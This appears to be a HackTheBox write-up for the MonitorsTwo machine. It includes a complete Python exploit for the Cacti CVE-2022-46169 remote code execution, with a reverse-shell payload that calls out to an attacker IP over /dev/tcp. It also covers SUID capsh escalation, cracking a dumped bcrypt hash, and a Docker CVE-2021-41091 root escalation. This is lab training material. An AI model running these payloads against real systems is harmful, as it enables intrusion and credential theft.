+++
title = "HTB - MonitorsTwo"
date = "2023-09-05"
author = "Brainmoustache"
authorTwitter = "Brainmoustache" #do not include @
cover = ""
tags = ["resume", "hackthebox", "monitorstwo"]
keywords = ["", ""]
description = "Resume of MonitorsTwo from HackTheBox"
showFullContent = false
readingTime = true
hideComments = false
color = "blue"
+++

# HTB - MonitorsTwo
## Resume
- Finding open port 80
- Cacti software version 1.2.22 vulnerable to `CVE-2022-46169`, `remote_agent.php` is vulnerable to code injection
- Getting access into the Docker
- Escalate to root with `/sbin/capsh` because of SUID privilege
- With root privilege, we can interact with the MySQL through the same command as `entrypoint.sh`
- We can find the hash password of `marcus` and crack it.
- SSH into the box as `marcus` and there is a email sent from the `administrator`
- Moby, the Docker Engine is vulnerable to `CVE-2021-41091`
- Got root

--- 

## Enumeration:
Nmap
```bash
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
|_http-title: Login to Cacti
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User exploit
Looking at the website, we can find that the version running of `cacti` is `1.2.22`
Searching on the Web to find potential exploitation script, there is one available that could be used to exploit the web application (see reference).

To exploit the application, one must change the value of `/bin/sh` to `/bin/bash` inside the exploit.
```python
┌──(kali㉿kali)-[~/hackthebox/monitor2/cacti_exploit]
└─$ python3 CVE-2022-46169.py -c 'whoami' http://10.129.163.91/ 
[*] Trying for 1 - 100 host ids
[+] Exploit Completed for host_id = 1
[{"value":"18","rrd_name":"proc","local_data_id":"1"},{"value":"1min:0.11 5min:0.03 10min:0.01","rrd_name":"","local_data_id":"2"},{"value":"0","rrd_name":"users","local_data_id":"3"},{"value":"2897392","rrd_name":"mem_buffers","local_data_id":"4"},{"value":"1048572","rrd_name":"mem_swap","local_data_id":"5"},{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
```

Modified script

```python
import requests
import argparse

parser = argparse.ArgumentParser(
    prog='Poc for CVE-2022-46169',
    description='Exploit Unauthenticated RCE on Cacti <= 1.2.22',
    epilog='Author: saspect')

parser.add_argument('target', help='URL of the Cacti application.')


group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-f', type=argparse.FileType(),
                   help='File containing the command', dest='file')
group.add_argument('-c', help='Command', dest='cmd')

parser.add_argument(
    '--n_host_ids', help='The range of host_ids to try (0 - n)', default=100, dest='n_ids', type=int)

parser.add_argument(
    '--n_local_data_ids', help='The range of local_data_ids to try (0 - n)', default=50, dest='n_localids', type=int)


args = parser.parse_args()

if args.file:   
    cmd = args.file.read().strip()
elif args.cmd:
    cmd = args.cmd
else:
    parser.print_help()
    exit(1)


payload = f'; /bin/bash -c "/bin/sh -i >& /dev/tcp/10.10.14.100/7001 0>&1"'

local_data_ids = [x for x in range(0, args.n_localids)]
target_ip = args.target.split("/")[2]

print(f"[*] Trying for 1 - {args.n_ids} host ids")


for host_id in range(args.n_ids):
    url = f'{args.target}/remote_agent.php'
    params = {'action': 'polldata', 'host_id': host_id,
              'poller_id': payload, 'local_data_ids[]': local_data_ids}
    headers = {'X-Forwarded-For': '127.0.0.1'}

    r = requests.get(url, params=params, headers=headers)
    if('proc' in r.text):
        print(f"[+] Exploit Completed for host_id = {host_id}")
        print(r.text)
        break
```

Running this command, you get a reverse shell as `www-data`

```bash
python3 CVE-2022-46169.py -c '/bin/sh -i >& /dev/tcp/10.10.14.100/7001 0>&1' http://10.129.163.91/
```

We end up inside a docker container. Looking to privilege escalation, we find a binary with `SUID` bit set that can help us. 
```bash
find / -perm -4444 2>/dev/null

/sbin/capsh
```

With the help of GTFObins we can easily escalate our privileges inside the docker
```bash
./capsh --gid=0 --uid=0 --
```

With root access, we have access to `entrypoint.sh` file content 
```bash
root@50bca5e748b0:/# cat entrypoint.sh 
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

With the previous information, we realized that we can run command in the MYSQL database and get information about the `user_auth` table.

Using this command line, we can find information about different user from cacti db

`mysql --host=db --user=root --password=root cacti -e "select * from user_auth"`

```bash
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_chan
ge | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange |
 lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms | 
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+--------------
---+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+
-----------+------------------+--------+-----------------+----------+-------------+ 
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on           
   | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |
        -1 | -1               |        |               0 |        0 |   663348655 | 
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on           
   | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |
        -1 | -1               |        |               0 |        0 |           0 | 
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |              
   | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |
        -1 |                  | on     |               0 |        0 |  2135691668 | 
+----+----------+--------------------------------------------------------------+------
```

`marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C`

```bash
┌──(kali㉿kali)-[~/hackthebox/monitor2]
└─$ echo -n '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C' > hash

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                        
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)     
1g 0:00:00:37 DONE (2023-05-31 17:57) 0.02694g/s 229.9p/s 229.9c/s 229.9C/s 474747..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Login as `marcus` into the box
```bash
ssh marcus:funkymonkey@10.129.164.55
```

user.txt
```bash
bea2ad7a9e086406bb96114a39896829
```

## Root exploit
Marcus user has a mail available from `administrator@monitorstwo.htb`

```bash
marcus@monitorstwo:~$ cat /var/mail/marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Moby, the Docker Engine is vulnerable to the exploit `CVE-2021-41091` 

### Summary
CVE-2021-41091 is a flaw in Moby (Docker Engine) that allows unprivileged Linux users to traverse and execute programs within the data directory (usually located at /var/lib/docker) due to improperly restricted permissions. This vulnerability is present when containers contain executable programs with extended permissions, such as setuid. Unprivileged Linux users can then discover and execute those programs, as well as modify files if the UID of the user on the host matches the file owner or group inside the container.

Here are the useful commands
```bash
marcus@monitorstwo:/tmp$ ./exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p

bash-5.1# whoami
root
bash-5.1# 
```

root.txt
```bash
root.txt:ee5d533931682430845b4c38ad16b362
```

___
## Resources:

| Hyperlink | Info |
| --------- | ---- |
| https://github.com/sAsPeCt488/CVE-2022-46169 | CVE-2022-46169 - Unauthenticated RCE on cacti <= 1.2.22 |
| https://github.com/UncleJ4ck/CVE-2021-41091 | CVE-2021-41091 - LPE in Moby (Docker Engine) < 20.10.9 | 
| https://gtfobins.github.io/gtfobins/capsh/ | GTFObins capsh |